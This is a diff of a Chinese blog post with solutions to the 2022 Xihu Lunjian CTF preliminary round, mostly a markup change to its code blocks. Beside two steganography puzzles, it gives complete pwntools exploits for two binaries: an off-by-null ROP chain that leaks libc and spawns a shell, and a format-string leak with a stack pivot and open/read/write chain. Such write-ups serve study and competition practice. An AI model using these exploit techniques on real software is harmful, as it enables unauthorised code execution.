@@ -1,33 +1,33 @@
 <!DOCTYPE html><html lang="zh-CN"><head><title>2022年西湖论剑初赛 部分题解</title><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="stylesheet" href="/css/highlight/xcode.min.css"><link rel="stylesheet" href="/css/bootstrap/bootstrap-tooltips.css"><link rel="stylesheet" href="/css/post.css"><script src="/js/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body><script>if (/mobile/i.test(navigator.userAgent) || /android/i.test(navigator.userAgent)) {
   document.body.classList.add('mobile')
 }</script><div><div class="inner"><h1>2022年西湖论剑初赛 部分题解</h1><div class="time">2023-02-18</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-%E2%80%93-%E7%AD%BE%E5%88%B0%E9%A2%98%E5%96%B5%EF%BC%9A"><span class="toc-text">MISC – 签到题喵：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-%E2%80%93-mp3"><span class="toc-text">MISC – mp3:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-%E2%80%93-babycalc"><span class="toc-text">PWN – babycalc :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-%E2%80%93-Message-Board"><span class="toc-text">PWN – Message Board</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%EF%BC%9A"><span class="toc-text">相关资料：</span></a></li></ol><h2 id="MISC-–-签到题喵："><a href="#MISC-–-签到题喵：" class="headerlink" title="MISC – 签到题喵："></a>MISC – 签到题喵：</h2><p>图片末尾有些奇怪数据：</p>
-<pre><code>E7BB99E8BF99E4B8AAE585ACE4BC97E58FB7E58F91E98081EFBC9AE2809CE8A5BFE6B996E8AEBAE5899132303233E68891E69DA5E4BA86EFBC81E2809DE88EB7E5BE9720666C6167E38082
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">E7BB99E8BF99E4B8AAE585ACE4BC97E58FB7E58F91E98081EFBC9AE2809CE8A5BFE6B996E8AEBAE5899132303233E68891E69DA5E4BA86EFBC81E2809DE88EB7E5BE9720666C6167E38082<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>16进制UTF-8解码得：<code>给这个公众号发送：“西湖论剑2023我来了！”获得 flag。</code></p>
 <br>
 
 <h2 id="MISC-–-mp3"><a href="#MISC-–-mp3" class="headerlink" title="MISC – mp3:"></a>MISC – mp3:</h2><p>用16进制编辑器打开，发现结尾的标识符为Png的，手动CV提出数据保存为png图片（binwalk -Me提不出来，疑惑）</p>
 <p>图片为黑白块，用脚本转黑为0，白为1：（使用zsteg也可以）</p>
-<pre><code class="python">from PIL import Image
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from PIL import Image
 import struct
 
-pic = Image.open(&#39;cipher.png&#39;)
-a, b = pic.size
+pic &#x3D; Image.open(&#39;cipher.png&#39;)
+a, b &#x3D; pic.size
 
-fp = open(&#39;flag.zip&#39;, &#39;wb&#39;)
-flag = &quot;&quot;
+fp &#x3D; open(&#39;flag.zip&#39;, &#39;wb&#39;)
+flag &#x3D; &quot;&quot;
 for y in range(b):
     for x in range(a):
-        #flag += str(pic.getpixel((x, y))//255)
-        if pic.getpixel((x, y)) == 0:
-            flag += &quot;0&quot;
-        if pic.getpixel((x, y)) == 255:
-            flag += &quot;1&quot;
+        #flag +&#x3D; str(pic.getpixel((x, y))&#x2F;&#x2F;255)
+        if pic.getpixel((x, y)) &#x3D;&#x3D; 0:
+        	flag +&#x3D; &quot;0&quot;
+        if pic.getpixel((x, y)) &#x3D;&#x3D; 255:
+        	flag +&#x3D; &quot;1&quot;
 
 for i in range(0, len(flag), 8):
     fp.write(struct.pack(&#39;B&#39;, int(flag[i:i+8], 2)))
-fp.close()
-</code></pre>
+fp.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>得到一个加密的zip文件。</p>
 <p>对cipher.mp3文件使用MP3stego解密，密码为空：</p>
 <p><code>.\Decode.exe -X .\cipher.mp3</code> </p>
@@ -36,15 +36,15 @@ fp.close()
 <p>然后再使用jjencode进行解密，得到flag。</p>
 <br>
 
-<h2 id="PWN-–-babycalc"><a href="#PWN-–-babycalc" class="headerlink" title="PWN – babycalc :"></a>PWN – babycalc :</h2><pre><code class="c">// 关键代码
-for ( i = 0; i &lt;= 15; ++i )
+<h2 id="PWN-–-babycalc"><a href="#PWN-–-babycalc" class="headerlink" title="PWN – babycalc :"></a>PWN – babycalc :</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">&#x2F;&#x2F; 关键代码
+for ( i &#x3D; 0; i &lt;&#x3D; 15; ++i )
   &#123;
     printf(&quot;number-%d:&quot;, (unsigned int)(i + 1));
-    buf[(int)read(0, buf, 0x100uLL)] = 0;       // off by null
-    v0 = strtol(buf, 0LL, 10);                  // strtol: string -&gt; number
-    *(&amp;v3 + i) = v0;
-  &#125;
-</code></pre>
+    buf[(int)read(0, buf, 0x100uLL)] &#x3D; 0;       &#x2F;&#x2F; off by null
+    v0 &#x3D; strtol(buf, 0LL, 10);                  &#x2F;&#x2F; strtol: string -&gt; number
+    *(&amp;v3 + i) &#x3D; v0;
+  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <ul>
 <li>对buf写入数据时，存在off by null的漏洞，可以将rbp的末字节覆盖为\x00；</li>
 <li>i为有符号变量。1）可以覆写为负值，对栈的正方向任意写；2）大于等于15时，对栈的负方向（ret_addr, rbp一方向）任意写一个字节数据；</li>
@@ -54,142 +54,142 @@ for ( i = 0; i &lt;= 15; ++i )
 <p>rop链：leak libc + ret2csu写入system_addr + get shell</p>
 <p>当然，首先需要对if的条件求解方程。可以手算，也可以使用z3。</p>
 <p>z3求解脚本（现学的，写得很赘余）：</p>
-<pre><code class="python">from z3 import *
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from z3 import *
 
-v3 = Real(&#39;v3&#39;)
-v4 = Real(&#39;v4&#39;)
-v5 = Real(&#39;v5&#39;)
-v6 = Real(&#39;v6&#39;)
-v7 = Real(&#39;v7&#39;)
-v8 = Real(&#39;v8&#39;)
-v9 = Real(&#39;v9&#39;)
-v10 = Real(&#39;v10&#39;)
-v11 = Real(&#39;v11&#39;)
-v12 = Real(&#39;v12&#39;)
-v13 = Real(&#39;v13&#39;)
-v14 = Real(&#39;v14&#39;)
-v15 = Real(&#39;v15&#39;)
-v16 = Real(&#39;v16&#39;)
-v17 = Real(&#39;v17&#39;)
-v18 = Real(&#39;v18&#39;)
+v3 &#x3D; Real(&#39;v3&#39;)
+v4 &#x3D; Real(&#39;v4&#39;)
+v5 &#x3D; Real(&#39;v5&#39;)
+v6 &#x3D; Real(&#39;v6&#39;)
+v7 &#x3D; Real(&#39;v7&#39;)
+v8 &#x3D; Real(&#39;v8&#39;)
+v9 &#x3D; Real(&#39;v9&#39;)
+v10 &#x3D; Real(&#39;v10&#39;)
+v11 &#x3D; Real(&#39;v11&#39;)
+v12 &#x3D; Real(&#39;v12&#39;)
+v13 &#x3D; Real(&#39;v13&#39;)
+v14 &#x3D; Real(&#39;v14&#39;)
+v15 &#x3D; Real(&#39;v15&#39;)
+v16 &#x3D; Real(&#39;v16&#39;)
+v17 &#x3D; Real(&#39;v17&#39;)
+v18 &#x3D; Real(&#39;v18&#39;)
 
-s = Solver()
-s.add(v5*v4*v3 - v6 == 36182)
-s.add(v3 == 19)
-s.add(v5*19*v4 + v6 == 36322)
-s.add((v13+v3-v8)*v16 == 32835)
-s.add((v4 * v3 - v5) * v6 == 44170)
-s.add((v5 + v4 * v3) * v6 == 51590)
-s.add(v9 * v8 * v7 - v10 == 61549)
-s.add(v10 * v15 + v4 + v18 == 19037)
-s.add(v9 * v8 * v7 + v10 == 61871)
-s.add((v8 * v7 - v9) * v10 == 581693)
-s.add(v11 == 50)
-s.add((v9 + v8 * v7) * v10 == 587167)
-s.add(v13 * v12 * v11 - v14 == 1388499)
-s.add(v13 * v12 * v11 + v14 == 1388701)
-s.add((v12 * v11 - v13) * v14 == 640138)
-s.add((v11 * v5 - v16) * v12 == 321081)
-s.add((v13 + v12 * v11) * v14 == 682962)
-s.add(v17 * v16 * v15 - v18 == 563565)
-s.add(v17 * v16 * v15 + v18 == 563571)
-s.add(v14 == 101)
-s.add((v16 * v15 - v17) * v18 == 70374)
-s.add((v17 + v16 * v15) * v18 == 70518)
+s &#x3D; Solver()
+s.add(v5*v4*v3 - v6 &#x3D;&#x3D; 36182)
+s.add(v3 &#x3D;&#x3D; 19)
+s.add(v5*19*v4 + v6 &#x3D;&#x3D; 36322)
+s.add((v13+v3-v8)*v16 &#x3D;&#x3D; 32835)
+s.add((v4 * v3 - v5) * v6 &#x3D;&#x3D; 44170)
+s.add((v5 + v4 * v3) * v6 &#x3D;&#x3D; 51590)
+s.add(v9 * v8 * v7 - v10 &#x3D;&#x3D; 61549)
+s.add(v10 * v15 + v4 + v18 &#x3D;&#x3D; 19037)
+s.add(v9 * v8 * v7 + v10 &#x3D;&#x3D; 61871)
+s.add((v8 * v7 - v9) * v10 &#x3D;&#x3D; 581693)
+s.add(v11 &#x3D;&#x3D; 50)
+s.add((v9 + v8 * v7) * v10 &#x3D;&#x3D; 587167)
+s.add(v13 * v12 * v11 - v14 &#x3D;&#x3D; 1388499)
+s.add(v13 * v12 * v11 + v14 &#x3D;&#x3D; 1388701)
+s.add((v12 * v11 - v13) * v14 &#x3D;&#x3D; 640138)
+s.add((v11 * v5 - v16) * v12 &#x3D;&#x3D; 321081)
+s.add((v13 + v12 * v11) * v14 &#x3D;&#x3D; 682962)
+s.add(v17 * v16 * v15 - v18 &#x3D;&#x3D; 563565)
+s.add(v17 * v16 * v15 + v18 &#x3D;&#x3D; 563571)
+s.add(v14 &#x3D;&#x3D; 101)
+s.add((v16 * v15 - v17) * v18 &#x3D;&#x3D; 70374)
+s.add((v17 + v16 * v15) * v18 &#x3D;&#x3D; 70518)
 
 print(s.check())
-print(s.model())
-</code></pre>
+print(s.model())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>EXP：（基于Loτυs师傅的进行修改）</p>
-<pre><code class="python">from pwn import *
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 from LibcSearcher import *
-context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
 
-# io = process(&quot;./babycalc&quot;)
-elf = ELF(&quot;./babycalc&quot;)
-libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+# io &#x3D; process(&quot;.&#x2F;babycalc&quot;)
+elf &#x3D; ELF(&quot;.&#x2F;babycalc&quot;)
+libc &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)
 
-pop6_ret = 0x400c9a
-pop_rdi_ret = 0x400ca3
-ret = 0x400ca4
+pop6_ret &#x3D; 0x400c9a
+pop_rdi_ret &#x3D; 0x400ca3
+ret &#x3D; 0x400ca4
 
-num = [19,36,53,70,55,66,17,161,50,131,212,101,118,199,24,3]
+num &#x3D; [19,36,53,70,55,66,17,161,50,131,212,101,118,199,24,3]
 
 def csu(rdi, rsi, rdx, call_addr):
-    payload = p64(pop6_ret) + p64(0) + p64(1) + p64(call_addr) + p64(rdx) + p64(rsi) + p64(rdi) + p64(0x400c80) + p64(0)*7
-    return payload
+	payload &#x3D; p64(pop6_ret) + p64(0) + p64(1) + p64(call_addr) + p64(rdx) + p64(rsi) + p64(rdi) + p64(0x400c80) + p64(0)*7
+	return payload
 
 def pwn():
-    payload = str(0x18).encode().ljust(0x8, b&#39;\x00&#39;)
-    payload += p64(ret)*4  # ret chain
-    payload += p64(pop_rdi_ret) + p64(elf.got[&#39;puts&#39;]) + p64(elf.plt[&#39;puts&#39;])  # leak libc
-    payload += csu(0, elf.got[&#39;puts&#39;], 0x30, elf.got[&#39;read&#39;])   # system.plt -&gt; system.got
-    payload += p64(pop_rdi_ret) + p64(elf.got[&#39;puts&#39;]+8) + p64(elf.plt[&#39;puts&#39;]) # get shell
+	payload &#x3D; str(0x18).encode().ljust(0x8, b&#39;\x00&#39;)
+	payload +&#x3D; p64(ret)*4  # ret chain
+	payload +&#x3D; p64(pop_rdi_ret) + p64(elf.got[&#39;puts&#39;]) + p64(elf.plt[&#39;puts&#39;])  # leak libc
+	payload +&#x3D; csu(0, elf.got[&#39;puts&#39;], 0x30, elf.got[&#39;read&#39;])   # system.plt -&gt; system.got
+	payload +&#x3D; p64(pop_rdi_ret) + p64(elf.got[&#39;puts&#39;]+8) + p64(elf.plt[&#39;puts&#39;]) # get shell
 
-    for i in range(0x10):
-        payload += p8(num[i])
+	for i in range(0x10):
+		payload +&#x3D; p8(num[i])
 
-    payload = payload.ljust(0xfc, b&#39;\x00&#39;) + p32(0x38) # point to ret_addr
+	payload &#x3D; payload.ljust(0xfc, b&#39;\x00&#39;) + p32(0x38) # point to ret_addr
 
-    io.recvuntil(&quot;number-&quot;)
-    io.send(payload)
-    puts_addr=u64(io.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(0x8,b&#39;\x00&#39;))
-    print(hex(puts_addr))
-    pause()
+	io.recvuntil(&quot;number-&quot;)
+	io.send(payload)
+	puts_addr&#x3D;u64(io.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(0x8,b&#39;\x00&#39;))
+	print(hex(puts_addr))
+	pause()
 
-    libc_base = puts_addr - libc.sym[&#39;puts&#39;]
-    system_addr = libc_base + libc.sym[&#39;system&#39;]
-    io.send(p64(system_addr) + b&quot;/bin/sh\x00&quot;)
-    sleep(1)
-    io.interactive()
+	libc_base &#x3D; puts_addr - libc.sym[&#39;puts&#39;]
+	system_addr &#x3D; libc_base + libc.sym[&#39;system&#39;]
+	io.send(p64(system_addr) + b&quot;&#x2F;bin&#x2F;sh\x00&quot;)
+	sleep(1)
+	io.interactive()
 
 while True:
-    io = process(&quot;./babycalc&quot;)
-    try:
-        pwn()
-    except EOFError:
-        io.close()
-        continue
-</code></pre>
+	io &#x3D; process(&quot;.&#x2F;babycalc&quot;)
+	try:
+		pwn()
+	except EOFError:
+		io.close()
+		continue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>发现爆栈有时候出现些问题：1）执行流卡住； 2）libc地址泄露不对；😬</p>
 <br>
 
 <h2 id="PWN-–-Message-Board"><a href="#PWN-–-Message-Board" class="headerlink" title="PWN – Message Board"></a>PWN – Message Board</h2><p>开了沙箱，execve调用被禁用。</p>
-<pre><code class="c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
 &#123;
-  char *v3; // rax
-  char buf[8]; // [rsp+0h] [rbp-C0h] BYREF
-  char dest[8]; // [rsp+8h] [rbp-B8h] BYREF
-  char v7[176]; // [rsp+10h] [rbp-B0h] BYREF
+  char *v3; &#x2F;&#x2F; rax
+  char buf[8]; &#x2F;&#x2F; [rsp+0h] [rbp-C0h] BYREF
+  char dest[8]; &#x2F;&#x2F; [rsp+8h] [rbp-B8h] BYREF
+  char v7[176]; &#x2F;&#x2F; [rsp+10h] [rbp-B0h] BYREF
 
-  Init();                                       // sandbox
+  Init();                                       &#x2F;&#x2F; sandbox
   if ( !one )
   &#123;
     strcpy(dest, &quot;Hello, &quot;);
     puts(&quot;Welcome to DASCTF message board, please leave your name:&quot;);
     read(0, buf, 8uLL);
-    one = 1;
+    one &#x3D; 1;
   &#125;
-  v3 = strcat(dest, buf);
-  printf(v3);                                   // 格式化字符串漏洞
+  v3 &#x3D; strcat(dest, buf);
+  printf(v3);                                   &#x2F;&#x2F; 格式化字符串漏洞
   puts(&quot;Now, please say something to DASCTF:&quot;);
-  read(0, v7, 0xC0uLL);                         // 可覆盖rbp、ret_addr
+  read(0, v7, 0xC0uLL);                         &#x2F;&#x2F; 可覆盖rbp、ret_addr
   puts(&quot;Posted Successfully~&quot;);
   return 0LL;
-&#125;
-</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>存在格式化字符串漏洞和栈溢出。格式化字符串漏洞可以直接泄露出libc基址，由于禁用了execve，所以需要用orw得到flag。但栈溢出仅可溢出0x10字节，所以需要栈迁移。</p>
 <p>EXP：</p>
-<pre><code class="python">from pwn import *
-context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
 
-io = process(&quot;./pwn&quot;)
-libc = ELF(&quot;./libc.so.6&quot;)
-elf = ELF(&quot;./pwn&quot;)
-leave_ret = 0x4013a2
-bss = 0x404080
-pop_rdi = 0x401413
-main = 0x401378
+io &#x3D; process(&quot;.&#x2F;pwn&quot;)
+libc &#x3D; ELF(&quot;.&#x2F;libc.so.6&quot;)
+elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)
+leave_ret &#x3D; 0x4013a2
+bss &#x3D; 0x404080
+pop_rdi &#x3D; 0x401413
+main &#x3D; 0x401378
 
 def debug():
     gdb.attach(io)
@@ -198,47 +198,47 @@ def debug():
 io.recvuntil(&quot;please leave your name:&quot;)
 io.sendline(&quot;%31$p&quot;)
 io.recvuntil(&quot;Hello, &quot;)
-addr = int(io.recvuntil(b&#39;\n&#39;)[:-1], 16) - 243
+addr &#x3D; int(io.recvuntil(b&#39;\n&#39;)[:-1], 16) - 243
 print(hex(addr))
 # debug()
 
-libc_base = addr - libc.sym[&quot;__libc_start_main&quot;]
-read_addr = libc_base + libc.sym[&#39;read&#39;]
-write_addr = libc_base + libc.sym[&#39;write&#39;]
-open_addr = libc_base + libc.sym[&#39;open&#39;]
-pop_rsi = libc_base + 0x2601f
-pop_rdx = libc_base + 0x142c92
+libc_base &#x3D; addr - libc.sym[&quot;__libc_start_main&quot;]
+read_addr &#x3D; libc_base + libc.sym[&#39;read&#39;]
+write_addr &#x3D; libc_base + libc.sym[&#39;write&#39;]
+open_addr &#x3D; libc_base + libc.sym[&#39;open&#39;]
+pop_rsi &#x3D; libc_base + 0x2601f
+pop_rdx &#x3D; libc_base + 0x142c92
 
 io.recvuntil(&quot;please say something to DASCTF:&quot;)
-payload = b&#39;A&#39;*0xb0 + p64(bss+0x200) + p64(main)
+payload &#x3D; b&#39;A&#39;*0xb0 + p64(bss+0x200) + p64(main)
 io.send(payload)
 
-payload = b&quot;./flag\x00\x00&quot; # 0x4041d0
-payload += p64(pop_rdi)
-payload += p64(0x4041d0)
-payload += p64(pop_rsi)
-payload += p64(0)
-payload += p64(open_addr)
-payload += p64(pop_rdi)
-payload += p64(3)
-payload += p64(pop_rsi)
-payload += p64(0x404700)
-payload += p64(pop_rdx)
-payload += p64(0x100)
-payload += p64(read_addr)
-payload += p64(pop_rdi)
-payload += p64(1)
-payload += p64(pop_rsi)
-payload += p64(0x404700)
-payload += p64(pop_rdx)
-payload += p64(0x100)
-payload += p64(write_addr)
-payload = payload.ljust(0xb0, b&quot;a&quot;)
-payload += p64(0x4041d0)
-payload += p64(leave_ret)
+payload &#x3D; b&quot;.&#x2F;flag\x00\x00&quot; # 0x4041d0
+payload +&#x3D; p64(pop_rdi)
+payload +&#x3D; p64(0x4041d0)
+payload +&#x3D; p64(pop_rsi)
+payload +&#x3D; p64(0)
+payload +&#x3D; p64(open_addr)
+payload +&#x3D; p64(pop_rdi)
+payload +&#x3D; p64(3)
+payload +&#x3D; p64(pop_rsi)
+payload +&#x3D; p64(0x404700)
+payload +&#x3D; p64(pop_rdx)
+payload +&#x3D; p64(0x100)
+payload +&#x3D; p64(read_addr)
+payload +&#x3D; p64(pop_rdi)
+payload +&#x3D; p64(1)
+payload +&#x3D; p64(pop_rsi)
+payload +&#x3D; p64(0x404700)
+payload +&#x3D; p64(pop_rdx)
+payload +&#x3D; p64(0x100)
+payload +&#x3D; p64(write_addr)
+payload &#x3D; payload.ljust(0xb0, b&quot;a&quot;)
+payload +&#x3D; p64(0x4041d0)
+payload +&#x3D; p64(leave_ret)
 io.send(payload)
-io.interactive()
-</code></pre>
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <br>
 
 <h2 id="相关资料："><a href="#相关资料：" class="headerlink" title="相关资料："></a>相关资料：</h2><p>1、题目信息：<a target="_blank" rel="noopener" href="https://github.com/Randark-JMT/CTF_Archive/tree/main/2022%20xhlj">https://github.com/Randark-JMT/CTF_Archive/tree/main/2022%20xhlj</a></p>
@@ -247,7 +247,15 @@ io.interactive()
 <p>4、官方Reverse题解：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/cuBCzVechH6R3WpEWv80Kg">https://mp.weixin.qq.com/s/cuBCzVechH6R3WpEWv80Kg</a></p>
 <p>5、官方Crypto题解：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/-TvP1PIUcQfoWKzmA_kBbQ">https://mp.weixin.qq.com/s/-TvP1PIUcQfoWKzmA_kBbQ</a></p>
 <p>6、官方Web题解：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/BJ3_xmR0lDmGkaA9OBhGyg">https://mp.weixin.qq.com/s/BJ3_xmR0lDmGkaA9OBhGyg</a></p>
-<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script>window.dataLayer = window.dataLayer || [];
+<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script async="" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script><script>MathJax = {
+      tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+          fontCache: 'global'
+      }
+  };
+</script><script>window.dataLayer = window.dataLayer || [];
 function gtag(){dataLayer.push(arguments);}
 gtag('js', new Date());
 gtag('config', '');</script></html>
